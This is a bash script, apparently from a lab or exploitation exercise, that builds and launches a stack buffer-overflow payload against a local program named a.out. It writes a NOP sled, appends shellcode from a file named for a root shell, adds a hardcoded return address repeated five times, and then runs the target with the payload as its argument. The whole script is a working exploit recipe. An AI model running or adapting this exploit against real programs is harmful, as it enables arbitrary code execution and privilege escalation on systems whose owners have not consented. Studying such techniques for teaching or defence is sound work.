#! /bin/bash

shellcode_file_name="shellcode_root.bin"

target_program="a.out"

offset=312

buffer_address="\xa4\xcf\xff\xff"
echo "here"
wc -c shellcode_root.bin
shellcode_size=35

repeat_return_address=5
return_address_size=$((4*$repeat_return_address))
NOP_sled_size=$(($offset-$shellcode_size-$return_address_size))

payload_file_name="payload.bin"

#create an emptyfile, truncate if exists
printf "NOP Sled size: %d halfway: %d \n" $NOP_sled_size $((NOP_sled_size/2))
echo -n >$payload_file_name

#write NOPs
for (( i=1; i <= $NOP_sled_size; i++ ))
do
    echo -ne "\x90" >> $payload_file_name
done


#write shellcode
cat $shellcode_file_name >> $payload_file_name

#write repeated return address
for (( i=1; i <= $repeat_return_address; i++ ))
do
    echo -ne $buffer_address >> $payload_file_name
done

echo "payload ready and has size of " $(wc -c $payload_file_name)
hexdump -C $payload_file_name
echo "sending the payload..."
./$target_program $(cat $payload_file_name)
